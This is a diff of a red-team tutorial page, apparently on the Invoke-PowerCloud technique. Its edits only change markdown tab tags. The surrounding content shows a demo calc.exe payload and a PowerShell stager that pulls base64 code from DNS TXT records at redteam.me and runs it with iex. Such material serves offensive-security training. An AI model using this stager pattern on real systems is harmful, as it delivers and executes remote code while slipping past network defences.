@@ -79,14 +79,14 @@ host -t ns redteam.me
 
 Let's create a simple payload file - it will print a red message to the screen and open up a calc.exe:
 
-{% code-tabs %}
-{% code-tabs-item title="payload.txt" %}
+{% tabs %}
+{% tab title="payload.txt" %}
 ```csharp
 Write-host -foregroundcolor red "This is our first payload using Invoke-
 PowerCloud. As usual, let's pop the calc.exe"; Start-process calc.exe
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 ### Good to Go
 
@@ -98,13 +98,13 @@ PS C:\tools\powercloud> . .\powercloud.ps1; Invoke-PowerCloud -FilePath .\payloa
 
 The script will generate two stagers. One of them is shown here:
 
-{% code-tabs %}
-{% code-tabs-item title="attacker@victim" %}
+{% tabs %}
+{% tab title="attacker@victim" %}
 ```csharp
 $b64=""; (1..1) | ForEach-Object { $b64+=(nslookup -q=txt "$_.redteam.me")[-1] }; iex([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String(($b64 -replace('\t|"',"")))))
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 ![](../../.gitbook/assets/screenshot-from-2018-10-15-22-47-26.png)
 
